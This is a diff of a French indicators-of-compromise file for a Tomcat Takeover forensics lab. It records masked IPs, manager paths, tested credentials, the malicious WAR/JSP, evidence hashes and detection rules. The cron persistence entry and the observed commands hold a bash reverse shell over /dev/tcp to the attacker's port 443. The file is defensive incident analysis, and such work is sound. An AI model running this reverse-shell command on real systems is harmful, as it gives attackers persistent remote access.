@@ -1,44 +1,144 @@
-# Tomcat Takeover — IOCs
+# IOCs FR — Tomcat Takeover Lab
 
-## Sources
+## Adresses IP
 
-| Source | Usage |
+| IOC | Rôle | Commentaire |
+|---|---|---|
+| `**********` | Victime | Serveur Tomcat compromis |
+| `**********` | Attaquant | Source de l’énumération, de l’upload WAR et du reverse shell |
+| `**********` | Client légitime probable | Navigation normale observée avant l’attaque |
+
+## Ports
+
+| Port | Rôle |
 |---|---|
-| CyberDefenders | Scénario et questions |
-| PCAP | Preuves réseau |
-| Wireshark | Analyse des flux |
-| NetworkMiner | Vue réseau complémentaire |
+| `****` | Service Apache Tomcat exposé |
+| `**` | Reverse shell initial vers l’attaquant |
+| `***` | Port utilisé par la persistance cron |
+| `22` | SSH observé après la compromission dans le trafic |
 
-## Hashes de l’artefact
+## Chemins web
 
-| Type | Valeur | Commentaire |
-|---|---|---|
-| MD5 | `9ab62c5a2a1f8d0030f8240355305e7` | Hash du fichier PCAP |
-| SHA256 | `9a8db2ec46186ff541f8f307544a5ceb07ce702f36d36fd8ae964bcb53f716` | Hash du fichier PCAP |
+```text
+/
+ /docs/
+/examples/
+/*******
+/*******/
+/*******/html
+/*******/html/upload
+/host-manager
+/admin
+/admin-console
+/status
+/webdav
+/******/
+```
 
-## Réseau
+## Fichiers
 
-| Type | Valeur | Rôle | Commentaire |
-|---|---|---|---|
-| IP attaquant | À compléter | Source de l’attaque | Responsable du scan et des requêtes suspectes |
-| IP serveur | À compléter | Cible | Serveur web Tomcat |
-| Port admin | À compléter | Administration | Port du panneau d’administration |
+| Fichier | Rôle |
+|---|---|
+| `******.***` | Archive WAR malveillante uploadée |
+| `********.***` | JSP malveillante utilisée pour le reverse shell |
+| `WEB-INF/web.xml` | Configuration de l’application WAR |
+| `upload_raw.bin` | Données brutes extraites du POST d’upload |
+| `reverse_shell_stream_****.txt` | Flux TCP ASCII du reverse shell |
+| `tomcat_takeover_findings.md` | Rapport de synthèse |
+| `hashes_sha256.txt` | Hashes SHA256 des preuves |
 
-## HTTP
+## User-Agent suspect
 
-| Type | Valeur | Commentaire |
-|---|---|---|
-| Répertoire admin | À compléter | Répertoire découvert après énumération |
-| User-Agent outil | À compléter | Outil d’énumération identifié |
-| Identifiants | À masquer | Identifiants utilisés avec succès |
-| Fichier uploadé | À compléter | Fichier malveillant uploadé |
+```text
+************
+```
 
-## MITRE ATT&CK provisoire
+## Identifiants observés
 
-| Tactique | Technique | ID | Commentaire |
-|---|---|---|---|
-| Reconnaissance | Active Scanning | T1595 | Scan de ports observé |
-| Discovery | File and Directory Discovery | T1083 | Énumération de répertoires |
-| Credential Access | Brute Force | T1110 | Tentatives d’identification |
-| Initial Access | Exploit Public-Facing Application | T1190 | Compromission d’un service web exposé |
-| Persistence | Scheduled Task/Job | T1053 | Persistance planifiée à confirmer |
+Identifiants testés :
+
+```text
+*****:*****
+******:******
+admin:
+*****:******
+******:******
+*****:******
+```
+
+Identifiants valides :
+
+```text
+*****:******
+```
+
+## Reverse shell
+
+```text
+tcp.stream == ****
+**********:***** -> **********:80
+```
+
+## Persistance
+
+```cron
+* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/443 0>&1'
+```
+
+## Commandes observées
+
+```bash
+whoami
+cd /tmp
+pwd
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/443 0>&1'" > cron
+crontab -i cron
+crontab -l
+```
+
+## Hashes SHA256
+
+```text
+b0f9ed31b467a45f2ec77338b1b17fb455463423eb70593a4a64cb969c0de188  evidence/******.***
+bc06cf70994c655b3f558c820c570e43b7dc52b990e11a10b6856d19b84c5e41  evidence/upload_raw.bin
+88a7b5d5ebfbed35e86cddac74893685252c762bdc152942a57e0809e0e9bfad  evidence/reverse_shell_stream_****.txt
+6838dd4e167551f7910d2ce6ef23aeaf4f325c897cd5f1d70ee00492d8ceb1c0  evidence/tomcat_takeover_findings.md
+bc4900bad640e4937eb70575de02bea6541130e478d2c50d4cc4b2ca4dad4d22  evidence/extracted_war/********.***
+3c309168f34178227b65c752ff563db78d769c7c389a6c822a97523d575584a3  evidence/extracted_war/WEB-INF/web.xml
+```
+
+## Règles de détection possibles
+
+### Détection HTTP
+
+Chercher :
+
+```text
+User-Agent contient ********
+URI contient /*******
+URI contient /*******/html/upload
+URI contient /******/
+Méthode POST vers /*******/html/upload
+```
+
+### Détection réseau
+
+Chercher :
+
+```text
+Connexion sortante depuis un serveur Tomcat vers une IP externe ou inattendue
+Connexion sortante vers port 80 ou 443 après upload WAR
+Flux interactif avec petits paquets fréquents
+```
+
+### Détection système
+
+Chercher :
+
+```text
+Nouveau fichier WAR déployé
+Nouvelle JSP inconnue
+Modification crontab
+Commande bash avec /dev/tcp/
+Exécution Runtime.getRuntime().exec dans une JSP
+```
